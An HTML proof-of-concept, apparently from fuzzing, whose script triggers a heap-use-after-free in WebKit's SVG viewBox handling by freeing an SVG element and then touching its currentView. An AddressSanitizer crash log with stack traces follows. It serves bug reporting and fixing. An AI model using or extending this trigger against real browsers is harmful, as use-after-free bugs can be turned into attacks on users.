<!DOCTYPE html>
<html>
<head>
<style>
</style>
</head>

<body onload="fuzzer()">
<script>
function gc() {
    for(var i=0;i<100;i++) {
        a = new Uint8Array(1024*1024);
    }
}

function fuzzer() {
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    var view = svg.currentView;
    svg.pauseAnimations();
    svg = null;
    gc();
    var rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
    var viewBox = view.viewBox;
}

</script>
</body>
</html>

<!-- ASAN log
=================================================================
==66283==ERROR: AddressSanitizer: heap-use-after-free on address 0x616000072c90 at pc 0x00011dfb251d bp 0x7ffee22cb0e0 sp 0x7ffee22cb0d8
READ of size 4 at 0x616000072c90 thread T0
==66283==WARNING: invalid path to external symbolizer!
==66283==WARNING: Failed to use and restart external symbolizer!
    #0 0x11dfb251c in WebCore::SVGAnimatedProperty::SVGAnimatedProperty(WebCore::SVGElement*, WebCore::QualifiedName const&, WebCore::AnimatedPropertyType) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x42c451c)
    #1 0x11de1131e in WebCore::SVGAnimatedPropertyTearOff<WebCore::SVGRect>::SVGAnimatedPropertyTearOff(WebCore::SVGElement*, WebCore::QualifiedName const&, WebCore::AnimatedPropertyType, WebCore::FloatRect&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x412331e)
    #2 0x11de111ff in WebCore::SVGAnimatedPropertyTearOff<WebCore::SVGRect>::create(WebCore::SVGElement*, WebCore::QualifiedName const&, WebCore::AnimatedPropertyType, WebCore::FloatRect&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x41231ff)
    #3 0x11de11010 in WTF::RefPtr<WebCore::SVGAnimatedProperty, WTF::DumbPtrTraits<WebCore::SVGAnimatedProperty> > WebCore::SVGAnimatedProperty::lookupOrCreateAnimatedProperty<WebCore::SVGAnimatedPropertyTearOff<WebCore::SVGRect>, WebCore::FloatRect, (WebCore::AnimatedPropertyType)14>(WebCore::SVGElement&, WebCore::QualifiedName const&, WTF::AtomicString const&, WebCore::FloatRect&, WebCore::AnimatedPropertyState) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x4123010)
    #4 0x11de10e4d in WTF::RefPtr<WebCore::SVGAnimatedProperty, WTF::DumbPtrTraits<WebCore::SVGAnimatedProperty> > WebCore::SVGAnimatedAttributeAccessor<WebCore::SVGFitToViewBox, WebCore::SVGAnimatedAttribute<WebCore::SVGAnimatedPropertyTearOff<WebCore::SVGRect> >, (WebCore::AnimatedPropertyType)14>::lookupOrCreateAnimatedProperty<WebCore::SVGAnimatedPropertyTearOff<WebCore::SVGRect>, WebCore::FloatRect, (WebCore::AnimatedPropertyType)14>(WebCore::SVGElement&, WebCore::QualifiedName const&, WTF::AtomicString const&, WebCore::FloatRect&, WebCore::AnimatedPropertyState) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x4122e4d)
    #5 0x11de10805 in WebCore::SVGAnimatedAttributeAccessor<WebCore::SVGFitToViewBox, WebCore::SVGAnimatedAttribute<WebCore::SVGAnimatedPropertyTearOff<WebCore::SVGRect> >, (WebCore::AnimatedPropertyType)14>::lookupOrCreateAnimatedProperty(WebCore::SVGFitToViewBox&, WebCore::SVGElement&, WebCore::SVGAttribute const&, WebCore::AnimatedPropertyState) const (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x4122805)
    #6 0x11de0ee12 in WebCore::SVGAttributeRegistry<WebCore::SVGFitToViewBox>::lookupOrCreateAnimatedProperty(WebCore::SVGFitToViewBox&, WebCore::SVGElement&, WebCore::SVGAttribute const&, WebCore::AnimatedPropertyState) const (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x4120e12)
    #7 0x11de0d1f7 in WebCore::SVGAttributeOwnerProxyImpl<WebCore::SVGFitToViewBox>::lookupOrCreateAnimatedProperty(WebCore::SVGAttribute const&) const (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x411f1f7)
    #8 0x11b212f69 in WebCore::SVGAnimatedAttribute<WebCore::SVGAnimatedPropertyTearOff<WebCore::SVGRect> >::animatedProperty(WebCore::SVGAttributeOwnerProxy const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1524f69)
    #9 0x11b212d97 in WebCore::SVGFitToViewBox::viewBoxAnimated() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1524d97)
    #10 0x11b33f614 in WebCore::jsSVGViewSpecViewBoxGetter(JSC::ExecState&, WebCore::JSSVGViewSpec&, JSC::ThrowScope&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1651614)
    #11 0x11b326feb in long long WebCore::IDLAttribute<WebCore::JSSVGViewSpec>::get<&(WebCore::jsSVGViewSpecViewBoxGetter(JSC::ExecState&, WebCore::JSSVGViewSpec&, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)3>(JSC::ExecState&, long long, char const*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1638feb)
    #12 0x12ba1877d in JSC::PropertySlot::customGetter(JSC::ExecState*, JSC::PropertyName) const (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x29c777d)
    #13 0x12b38808d in llint_slow_path_get_by_id (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x233708d)
    #14 0x129d08d7e in llint_entry (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xcb7d7e)
    #15 0x129d11df0 in llint_entry (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xcc0df0)
    #16 0x129d02998 in vmEntryToJavaScript (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xcb1998)
    #17 0x12b081949 in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2030949)
    #18 0x12b6b7d0a in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2666d0a)
    #19 0x12b6b7eaf in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2666eaf)
    #20 0x12b6b8342 in JSC::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2667342)
    #21 0x11be7aabb in WebCore::JSExecState::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x218cabb)
    #22 0x11bec8f43 in WebCore::JSEventListener::handleEvent(WebCore::ScriptExecutionContext&, WebCore::Event&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x21daf43)
    #23 0x11c521a57 in WebCore::EventTarget::innerInvokeEventListeners(WebCore::Event&, WTF::Vector<WTF::RefPtr<WebCore::RegisteredEventListener, WTF::DumbPtrTraits<WebCore::RegisteredEventListener> >, 1ul, WTF::CrashOnOverflow, 16ul>, WebCore::EventTarget::EventInvokePhase) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2833a57)
    #24 0x11c51c6f7 in WebCore::EventTarget::fireEventListeners(WebCore::Event&, WebCore::EventTarget::EventInvokePhase) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x282e6f7)
    #25 0x11cef5ff9 in WebCore::DOMWindow::dispatchEvent(WebCore::Event&, WebCore::EventTarget*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3207ff9)
    #26 0x11cf060de in WebCore::DOMWindow::dispatchLoadEvent() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x32180de)
    #27 0x11c42fe9f in WebCore::Document::dispatchWindowLoadEvent() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2741e9f)
    #28 0x11c428972 in WebCore::Document::implicitClose() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x273a972)
    #29 0x11cd86c5b in WebCore::FrameLoader::checkCompleted() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3098c5b)
    #30 0x11cd835dc in WebCore::FrameLoader::finishedParsing() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x30955dc)
    #31 0x11c44d142 in WebCore::Document::finishedParsing() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x275f142)
    #32 0x11cabae97 in WebCore::HTMLDocumentParser::prepareToStopParsing() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2dcce97)
    #33 0x11cd6060a in WebCore::DocumentWriter::end() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x307260a)
    #34 0x11cd2a0d2 in WebCore::DocumentLoader::finishedLoading() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x303c0d2)
    #35 0x11ce7cde7 in WebCore::CachedResource::checkNotify() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x318ede7)
    #36 0x11ce76e9d in WebCore::CachedRawResource::finishLoading(WebCore::SharedBuffer*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3188e9d)
    #37 0x11ce0526e in WebCore::SubresourceLoader::didFinishLoading(WebCore::NetworkLoadMetrics const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x311726e)
    #38 0x10e7540a9 in WebKit::WebResourceLoader::didFinishResourceLoad(WebCore::NetworkLoadMetrics const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xe160a9)
    #39 0x10eb1ae63 in void IPC::handleMessage<Messages::WebResourceLoader::DidFinishResourceLoad, WebKit::WebResourceLoader, void (WebKit::WebResourceLoader::*)(WebCore::NetworkLoadMetrics const&)>(IPC::Decoder&, WebKit::WebResourceLoader*, void (WebKit::WebResourceLoader::*)(WebCore::NetworkLoadMetrics const&)) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x11dce63)
    #40 0x10eb1a0a2 in WebKit::WebResourceLoader::didReceiveWebResourceLoaderMessage(IPC::Connection&, IPC::Decoder&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x11dc0a2)
    #41 0x10e742799 in WebKit::NetworkProcessConnection::didReceiveMessage(IPC::Connection&, IPC::Decoder&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xe04799)
    #42 0x10d99342a in IPC::Connection::dispatchMessage(IPC::Decoder&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x5542a)
    #43 0x10d9872ae in IPC::Connection::dispatchMessage(std::__1::unique_ptr<IPC::Decoder, std::__1::default_delete<IPC::Decoder> >) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x492ae)
    #44 0x10d993e39 in IPC::Connection::dispatchOneIncomingMessage() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x55e39)
    #45 0x1290e4707 in WTF::RunLoop::performWork() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x93707)
    #46 0x1290e520a in WTF::RunLoop::performWork(void*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x9420a)
    #47 0x7fff45a25154 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x58154)
    #48 0x7fff45a250fa in __CFRunLoopDoSource0 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x580fa)
    #49 0x7fff45a08b94 in __CFRunLoopDoSources0 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x3bb94)
    #50 0x7fff45a0813d in __CFRunLoopRun (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x3b13d)
    #51 0x7fff45a07a27 in CFRunLoopRunSpecific (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x3aa27)
    #52 0x7fff47d6e3b9 in -[NSRunLoop(NSRunLoop) runMode:beforeDate:] (/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation:x86_64+0x1c3b9)
    #53 0x7fff47d6e28e in -[NSRunLoop(NSRunLoop) run] (/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation:x86_64+0x1c28e)
    #54 0x7fff72e20ee5 in _xpc_objc_main (/usr/lib/system/libxpc.dylib:x86_64+0x10ee5)
    #55 0x7fff72e209e4 in xpc_main (/usr/lib/system/libxpc.dylib:x86_64+0x109e4)
    #56 0x10d9313b5 in WebKit::XPCServiceMain(int, char const**) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent.Development:x86_64+0x1000013b5)
    #57 0x10d931d9d in main (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent.Development:x86_64+0x100001d9d)
    #58 0x7fff72bea08c in start (/usr/lib/system/libdyld.dylib:x86_64+0x1708c)

0x616000072c90 is located 16 bytes inside of 616-byte region [0x616000072c80,0x616000072ee8)
freed by thread T0 here:
    #0 0x11200304b in __sanitizer_mz_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/10.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x5804b)
    #1 0x129147c47 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xf6c47)
    #2 0x12b855375 in void JSC::MarkedBlock::Handle::specializedSweep<true, (JSC::MarkedBlock::Handle::EmptyMode)1, (JSC::MarkedBlock::Handle::SweepMode)1, (JSC::MarkedBlock::Handle::SweepDestructionMode)1, (JSC::MarkedBlock::Handle::ScribbleMode)0, (JSC::MarkedBlock::Handle::NewlyAllocatedMode)1, (JSC::MarkedBlock::Handle::MarksMode)1, JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::MarkedBlock::Handle::EmptyMode, JSC::MarkedBlock::Handle::SweepMode, JSC::MarkedBlock::Handle::SweepDestructionMode, JSC::MarkedBlock::Handle::ScribbleMode, JSC::MarkedBlock::Handle::NewlyAllocatedMode, JSC::MarkedBlock::Handle::MarksMode, JSC::JSDestructibleObjectDestroyFunc const&)::'lambda'(void*)::operator()(void*) const (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2804375)
    #3 0x12b85542a in void JSC::MarkedBlock::Handle::specializedSweep<true, (JSC::MarkedBlock::Handle::EmptyMode)1, (JSC::MarkedBlock::Handle::SweepMode)1, (JSC::MarkedBlock::Handle::SweepDestructionMode)1, (JSC::MarkedBlock::Handle::ScribbleMode)0, (JSC::MarkedBlock::Handle::NewlyAllocatedMode)1, (JSC::MarkedBlock::Handle::MarksMode)1, JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::MarkedBlock::Handle::EmptyMode, JSC::MarkedBlock::Handle::SweepMode, JSC::MarkedBlock::Handle::SweepDestructionMode, JSC::MarkedBlock::Handle::ScribbleMode, JSC::MarkedBlock::Handle::NewlyAllocatedMode, JSC::MarkedBlock::Handle::MarksMode, JSC::JSDestructibleObjectDestroyFunc const&)::'lambda'(unsigned long)::operator()(unsigned long) const (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x280442a)
    #4 0x12b8528bd in void JSC::MarkedBlock::Handle::specializedSweep<true, (JSC::MarkedBlock::Handle::EmptyMode)1, (JSC::MarkedBlock::Handle::SweepMode)1, (JSC::MarkedBlock::Handle::SweepDestructionMode)1, (JSC::MarkedBlock::Handle::ScribbleMode)0, (JSC::MarkedBlock::Handle::NewlyAllocatedMode)1, (JSC::MarkedBlock::Handle::MarksMode)1, JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::MarkedBlock::Handle::EmptyMode, JSC::MarkedBlock::Handle::SweepMode, JSC::MarkedBlock::Handle::SweepDestructionMode, JSC::MarkedBlock::Handle::ScribbleMode, JSC::MarkedBlock::Handle::NewlyAllocatedMode, JSC::MarkedBlock::Handle::MarksMode, JSC::JSDestructibleObjectDestroyFunc const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x28018bd)
    #5 0x12b84bd08 in void JSC::MarkedBlock::Handle::finishSweepKnowingHeapCellType<JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::JSDestructibleObjectDestroyFunc const&)::'lambda'()::operator()() const (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x27fad08)
    #6 0x12b7fcedb in void JSC::MarkedBlock::Handle::finishSweepKnowingHeapCellType<JSC::JSDestructibleObjectDestroyFunc>(JSC::FreeList*, JSC::JSDestructibleObjectDestroyFunc const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x27abedb)
    #7 0x12b7fcadc in JSC::JSDestructibleObjectHeapCellType::finishSweep(JSC::MarkedBlock::Handle&, JSC::FreeList*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x27abadc)
    #8 0x12aef3109 in JSC::MarkedBlock::Handle::sweep(JSC::FreeList*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1ea2109)
    #9 0x12aee870d in JSC::LocalAllocator::tryAllocateIn(JSC::MarkedBlock::Handle*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1e9770d)
    #10 0x12aee835b in JSC::LocalAllocator::tryAllocateWithoutCollecting() (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1e9735b)
    #11 0x12aee7d4c in JSC::LocalAllocator::allocateSlowCase(JSC::GCDeferralContext*, JSC::AllocationFailureMode) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1e96d4c)
    #12 0x11b1267bd in void* JSC::allocateCell<WebCore::JSSVGRectElement>(JSC::Heap&, unsigned long) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x14387bd)
    #13 0x11b126029 in WebCore::JSSVGRectElement::create(JSC::Structure*, WebCore::JSDOMGlobalObject*, WTF::Ref<WebCore::SVGRectElement, WTF::DumbPtrTraits<WebCore::SVGRectElement> >&&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1438029)
    #14 0x11b125f5b in std::__1::enable_if<std::is_same<WebCore::SVGRectElement, WebCore::SVGRectElement>::value, WebCore::JSDOMWrapperConverterTraits<WebCore::SVGRectElement>::WrapperClass*>::type WebCore::createWrapper<WebCore::SVGRectElement, WebCore::SVGRectElement>(WebCore::JSDOMGlobalObject*, WTF::Ref<WebCore::SVGRectElement, WTF::DumbPtrTraits<WebCore::SVGRectElement> >&&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1437f5b)
    #15 0x11b125eb2 in std::__1::enable_if<!(std::is_same<WebCore::SVGRectElement, WebCore::SVGElement>::value), WebCore::JSDOMWrapperConverterTraits<WebCore::SVGRectElement>::WrapperClass*>::type WebCore::createWrapper<WebCore::SVGRectElement, WebCore::SVGElement>(WebCore::JSDOMGlobalObject*, WTF::Ref<WebCore::SVGElement, WTF::DumbPtrTraits<WebCore::SVGElement> >&&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1437eb2)
    #16 0x11b0edd5d in WebCore::createJSSVGWrapper(WebCore::JSDOMGlobalObject*, WTF::Ref<WebCore::SVGElement, WTF::DumbPtrTraits<WebCore::SVGElement> >&&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x13ffd5d)
    #17 0x11bec7c57 in WebCore::createNewElementWrapper(WebCore::JSDOMGlobalObject*, WTF::Ref<WebCore::Element, WTF::DumbPtrTraits<WebCore::Element> >&&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x21d9c57)
    #18 0x11bec7e11 in WebCore::toJSNewlyCreated(JSC::ExecState*, WebCore::JSDOMGlobalObject*, WTF::Ref<WebCore::Element, WTF::DumbPtrTraits<WebCore::Element> >&&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x21d9e11)
    #19 0x11a71bb97 in std::__1::enable_if<IsExceptionOr<WebCore::ExceptionOr<WTF::Ref<WebCore::Element, WTF::DumbPtrTraits<WebCore::Element> > > >::value, JSC::JSValue>::type WebCore::toJSNewlyCreated<WebCore::IDLInterface<WebCore::Element>, WebCore::ExceptionOr<WTF::Ref<WebCore::Element, WTF::DumbPtrTraits<WebCore::Element> > > >(JSC::ExecState&, WebCore::JSDOMGlobalObject&, JSC::ThrowScope&, WebCore::ExceptionOr<WTF::Ref<WebCore::Element, WTF::DumbPtrTraits<WebCore::Element> > >&&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xa2db97)
    #20 0x11a71c0b6 in WebCore::jsDocumentPrototypeFunctionCreateElementNSBody(JSC::ExecState*, WebCore::JSDocument*, JSC::ThrowScope&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xa2e0b6)
    #21 0x11a6f9948 in long long WebCore::IDLOperation<WebCore::JSDocument>::call<&(WebCore::jsDocumentPrototypeFunctionCreateElementNSBody(JSC::ExecState*, WebCore::JSDocument*, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)0>(JSC::ExecState&, char const*) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xa0b948)
    #22 0x45a6fb801176  (<unknown module>)
    #23 0x129d11df0 in llint_entry (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xcc0df0)
    #24 0x129d11df0 in llint_entry (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xcc0df0)
    #25 0x129d02998 in vmEntryToJavaScript (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xcb1998)
    #26 0x12b081949 in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2030949)
    #27 0x12b6b7d0a in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2666d0a)
    #28 0x12b6b7eaf in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2666eaf)
    #29 0x12b6b8342 in JSC::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x2667342)

previously allocated by thread T0 here:
    #0 0x112002ae3 in __sanitizer_mz_malloc (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/10.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x57ae3)
    #1 0x7fff72d97806 in malloc_zone_malloc (/usr/lib/system/libsystem_malloc.dylib:x86_64+0x1806)
    #2 0x129148174 in bmalloc::DebugHeap::malloc(unsigned long) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xf7174)
    #3 0x12914336e in bmalloc::Allocator::tryAllocate(unsigned long) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0xf236e)
    #4 0x11ded605d in WebCore::SVGSVGElement::create(WebCore::QualifiedName const&, WebCore::Document&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x41e805d)
    #5 0x11b838acc in WebCore::svgConstructor(WebCore::QualifiedName const&, WebCore::Document&, bool) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1b4aacc)
    #6 0x11b7dbb4d in WebCore::SVGElementFactory::createElement(WebCore::QualifiedName const&, WebCore::Document&, bool) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x1aedb4d)
    #7 0x11c41dd14 in WebCore::Document::createElement(WebCore::QualifiedName const&, bool) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x272fd14)
    #8 0x11c420744 in WebCore::Document::createElementNS(WTF::AtomicString const&, WTF::String const&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2732744)
    #9 0x11a71c0a2 in WebCore::jsDocumentPrototypeFunctionCreateElementNSBody(JSC::ExecState*, WebCore::JSDocument*, JSC::ThrowScope&) (/Users/wen/workspace/webkit-asan/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xa2e0a2)
